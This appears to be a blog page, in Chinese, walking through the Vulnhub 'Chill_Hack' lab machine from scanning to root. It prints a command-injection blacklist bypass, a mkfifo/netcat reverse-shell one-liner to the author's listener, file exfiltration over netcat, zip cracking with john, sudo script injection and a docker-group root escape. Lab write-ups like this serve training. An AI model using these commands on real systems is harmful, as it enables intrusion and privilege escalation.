@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Vulnhub - Chill_Hack 靶场实战 | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Vulnhub">
+    <meta name="description" content="Vulnhub-Chill_Hack靶场实战 Vulnhub-Chill_Hack 靶场下载地址https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;chill-hack-1,622&#x2F; 废话不多说 直接开始 第一步使用kali扫描内网IP Arp-scan –l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub - Chill_Hack 靶场实战">
+<meta property="og:url" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Vulnhub-Chill_Hack靶场实战 Vulnhub-Chill_Hack 靶场下载地址https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;chill-hack-1,622&#x2F; 废话不多说 直接开始 第一步使用kali扫描内网IP Arp-scan –l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image10.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image11.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image12.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image13.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image14.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image15.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image16.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image17.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image18.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image19.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image20.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image21.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image22.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image23.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image24.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image25.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image26.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image27.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image28.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image29.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image30.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image31.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image32.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image33.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image34.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image35.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image36.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image37.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image38.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image39.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image40.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image41.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image42.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image43.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image44.png">
+<meta property="article:published_time" content="2021-10-17T08:31:38.000Z">
+<meta property="article:modified_time" content="2023-05-19T09:05:04.569Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/10/17/Chill_Hack/image1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Vulnhub - Chill_Hack 靶场实战</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Vulnhub - Chill_Hack 靶场实战</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-10-17T08:31:38.000Z" itemprop="datePublished" class="page-time">
+  2021-10-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Vulnhub-Chill-Hack"><span class="post-toc-number">1.</span> <span class="post-toc-text">Vulnhub-Chill_Hack</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Chill_Hack"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Vulnhub - Chill_Hack 靶场实战</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-10-17 16:31:38" datetime="2021-10-17T08:31:38.000Z"  itemprop="datePublished">2021-10-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Vulnhub-Chill-Hack"><a href="#Vulnhub-Chill-Hack" class="headerlink" title="Vulnhub-Chill_Hack"></a>Vulnhub-Chill_Hack</h1><p>靶场实战 Vulnhub-Chill_Hack</p>
+<p>靶场下载地址<a href="https://www.vulnhub.com/entry/chill-hack-1,622/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p>
+<p>废话不多说 直接开始</p>
+<p>第一步使用kali扫描内网IP</p>
+<p>Arp-scan –l</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image1.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>获得靶场IP为192.168.72.132</p>
+<p>对靶场进行端口扫描</p>
+<p>Nmap –A –v 192.168.72.132</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image2.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>发现存在21 22 80三个端口</p>
+<p>21端口存在匿名访问 咱们先访问看看</p>
+<p>用户名使用anonymous 密码为空</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image3.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功登陆</p>
+<p>查看有什么文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image4.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>发现存在一个txt文件 我们查看一下</p>
+<p>使用get下载到本地然后打开查看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image5.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image6.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>嗯…好像也没什么用</p>
+<p>我们还是先看看80端口的Web服务吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image7.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>看上去像是一个体育比赛的官网？</p>
+<p>扫描一下目录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image8.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>发现了一个有趣的URL <a href="http://192.168.72.132/secret/index.php" target="_blank" rel="noopener">http://192.168.72.132/secret/index.php</a></p>
+<p>可以执行命令</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image9.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>OK 突破口应该就在这里了</p>
+<p>当我输入ls想查看一下当前目录文件的时候</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image10.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>这时我想起来我们那个note.txt文件里的话是什么意思</p>
+<p>证明这里有过滤 就是不知道是白名单还是黑名单了</p>
+<p>经过我大量测试 该靶场为黑名单验证</p>
+<p>那就好办了 绕过吧</p>
+<p>出去吃了个饭 回来突然来了思路</p>
+<p>将两个指令结合起来 不就成了吗</p>
+<p>例如 ls会被拦截</p>
+<p>那就 whoami;ls</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image11.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功执行 我可真是个小机灵</p>
+<p>将该方法和NC反弹一结合 不就拿到shell了？</p>
+<p>经过大量测试 发现可用的反弹语句为</p>
+<p>dir;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.72.130 7777 &gt; &#x2F;tmp&#x2F;f</p>
+<p>本机监听 nc –lvp 7777</p>
+<p>执行 成功拿到一个shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image12.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image13.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>该shell权限还是较低 并且操作非常不便利 咱们要想办法提权</p>
+<p>查找python版本</p>
+<p>Which python</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image14.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功确认python版本为python3</p>
+<p>使用python3将shell进行提升</p>
+<p>python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image15.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功</p>
+<p>该命令不会对电脑有什么危害 但偶尔会有奇效</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image16.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>在这个文件夹下 这个hacker.php引起了我的注意 查看一下吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image17.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>在黑暗中我会看到答案？真就人均谜语人呗</p>
+<p>在hacker.php中 我们看到images文件夹中有一张图片 应该就是线索所在</p>
+<p>咱们进入images文件夹</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image18.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>OK 咱们把这张图片用nc下载下来 也可以用python3开启http服务进行下载 不过我图省事儿 就nc了吧</p>
+<p>本地电脑运行 nc –nvlp 4444 &gt; hacker-with-laptop_23-2147985341.jpg</p>
+<p>咱们保持原名不动</p>
+<p>Shell里运行 nc 192.168.72.130 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image19.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>OK 稍等一会儿 成功下载下来</p>
+<p>根据hacker.php中的提示 在黑暗中我们会看到答案 这不就是妥妥的图片隐写吗 不愧是我 最近的柯南没白看</p>
+<p>使用steghide查看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image20.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>果然存在一个名为backup.zip的压缩包 不愧是我</p>
+<p>依然使用steghide进行解压</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image21.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>OK 得到了这个名为backup.zip的压缩包文件</p>
+<p>我们现在将他解压缩</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image22.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>我丢啊 这里来个密码 成吧 再找</p>
+<p>找？找是不可能找的 就咱这暴脾气 爆他！</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image23.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>使用zip2johb生成了一个backup.john文件</p>
+<p>咱们使用john爆他</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image24.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>OK 完成</p>
+<p>咱们使用john查看密码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image25.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>密码为pass1word 行吧 经典弱口令</p>
+<p>接下来咱们解压文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image26.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功解压出来</p>
+<p>查看解压出来的文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image27.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>好家伙 还有个base64编码 解密吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image28.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>返回我们的shell 查看一下用户</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image29.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>使用我们得到的密码登入进用户anurodh</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image30.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功登入</p>
+<p>确认账户密码没问题了 这时候咱们就要用到一开始扫描出的22端口了</p>
+<p>毕竟shell是不稳定的 使用ssh服务登入吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image31.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>成功登入 有一个稳定的权限的感觉太爽了</p>
+<p>这时候肯定就是提权了是吧</p>
+<p>直接使用经典的sudo su</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image32.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>失败了 嗯… 情理之中 意料之外</p>
+<p>使用sudo –l查看sudo的权限 发现apaar可以提权？那就造他</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image33.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>查看apaar文件夹下的文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image34.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>发现apaar下有个txt文件 但由于权限文件我们无法访问</p>
+<p>但上述提到了 apaar下有个sh脚本我们可以执行 那就执行它</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image35.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>它需要一个名字 咱们随便输入即可</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image36.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>执行完毕了 但我不知道它有效果</p>
+<p>那就阅读一下吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image37.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>这个批处理 有点意思啊 似乎可以命令执行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image38.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>尝试成功 有点意思</p>
+<p>既然我们没有权限读取local.txt文件 那就让apaar来读取吧</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image39.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>啊这 我还以为是什么提权的东西呢 结果你告诉我 这就是个flag？</p>
+<p>那也行吧 flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</p>
+<p>OK 咱们继续找其他方法提权吧</p>
+<p>输入id查看权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image40.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>嗯？docker？要素察觉</p>
+<p>我们使用一些提权辅助工具<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a> 在里面搜搜docker</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image41.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>使用此命令即可提权docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image42.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image43.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>提权成功</p>
+<p>进入root目录 拿到最后一个flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2021/10/17/Chill_Hack/image44.png" alt="image" title>
+                </div>
+                <div class="image-caption">image</div>
+            </figure>
+
+<p>Flag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</p>
+<p>总结语：怎么说呢，这个靶场还是挺有意思的。我起初以为就是简单的一个命令执行getshell以后一个脚本提权就拿下了。没想到还有这么多步骤，挺严谨的吧</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/10/17/Chill_Hack/&title=《Vulnhub - Chill_Hack 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/10/17/Chill_Hack/&title=《Vulnhub - Chill_Hack 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/10/17/Chill_Hack/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Vulnhub - Chill_Hack 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/10/17/Chill_Hack/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/10/17/Chill_Hack/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/11/13/Kioptrix/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Vulnhub - Kioptrix Level 1 靶场实战</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/10/07/BlueSky/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Vulnhub - BlueSky 靶场实战</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: '',
+          clientSecret: '',
+          repo: '',
+          owner: '',
+          admin: [''],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
